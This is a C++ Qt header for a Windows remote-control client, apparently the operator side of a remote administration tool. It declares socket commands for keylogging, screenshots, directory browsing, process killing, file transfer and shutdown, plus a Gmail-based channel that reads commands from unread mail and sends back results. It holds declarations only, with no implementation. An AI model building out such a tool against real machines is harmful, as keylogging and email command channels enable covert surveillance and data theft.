#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>
#include <QTimer>
#include <QNetworkAccessManager>
#include <winsock2.h>
#include <QLabel>
#include <QScrollArea>
#include <QStackedWidget>
#include "selectremotedialog.h"
#include "gmailaccountdialog.h"

QT_BEGIN_NAMESPACE
namespace Ui { class MainWindow; }
QT_END_NAMESPACE

class MainWindow : public QMainWindow
{
    Q_OBJECT

public:
    MainWindow(QWidget *parent = nullptr);
    explicit MainWindow(SelectRemoteDialog::RemoteType type, QWidget *parent = nullptr);
    ~MainWindow();

private slots:
    void on_Connect_clicked();
    void on_Disconnect_clicked();
    void on_StartKeyLogger_clicked();
    void on_ScreenshotWebshot_clicked();
    void on_DirectoryTree_clicked();
    void on_ShutdownLock_clicked();
    void on_Download_clicked();
    void on_Clear_clicked();
    void on_MacAddress_clicked();
    void on_ListApp_clicked();
    void on_ListProce_clicked();
    void on_StopAppPro_clicked();
    void on_StartApp_clicked();
    void on_FileTransfer_clicked();
    void startGmailRemote();

private:
    void sendCommand(const std::string& cmd);
    void receiveFileAndShow();
    void uploadFileToServer();
    void downloadFileFromServer();
    void loadGoogleCredentials();
    void chooseRemoteMode();
    void getAccessToken(const QString&, const QString&, const QString&);
    void gmailRemoteTick();
    void sendGmailWithAttachment(const QString& accessToken, const QString& to, const QString& subject,
                                 const QString& body, const QString& filename, const QByteArray& filedata,
                                 const QString& fileMime);
    void sendGmailWithBodyOnly(const QString& accessToken, const QString& to, const QString& subject, const QString& body);
    void getAccessTokenAndSave(const QString& clientId, const QString& clientSecret, const QString& code);
    QString getGmailAddressFromToken(const QString& accessToken);
    QJsonArray loadGmailTokens();
    void saveGmailTokens(const QJsonArray& arr);
    void repairTokensJson();
    void setActiveGmailAccount(const QString& email);
    QJsonObject loadActiveGmailToken();
    void processOneMail();
    void finishGmailTick();
    QString readAllText(int maxWaitMs = 1000);
    void handleCommand(const QString& content);
    void persistActiveToken();
    bool refreshAccessToken();
    QNetworkRequest makeAuthRequest(const QUrl &url);
    void initTokenTimer();
    QJsonArray getUnreadMailList();
    void       markMailRead(const QString &msgId);


    QPixmap lastPixmap;
    QString lastFileName;
    QByteArray lastImageData;
    QString lastImageFormat;
    QString lastImageFileName;
    bool hasDownloadableFile = false;
    bool keyloggerRunning = false;
    Ui::MainWindow *ui;
    SOCKET sock;
    bool socketConnected;
    QTimer* keylogTimer = nullptr;
    QLabel *imageLabel;
    QScrollArea *imageScrollArea;
    QStackedWidget *stackWidget = nullptr;
    SelectRemoteDialog::RemoteType remoteType;
    QString googleClientId;
    QString googleClientSecret;
    QString googleAccessToken;
    QString googleRefreshToken;
    QTimer* gmailRemoteTimer = nullptr;
    GmailAccountDialog* currentGmailDialog = nullptr;
    bool gmailTickRunning = false;
    QString m_prevSaved;
    qint64  googleExpiresAt = 0;
    QString currentGmailEmail;
    static constexpr int kTokenSafeGapSec = 60;
    QNetworkAccessManager *networkMgr {nullptr};
};


#endif
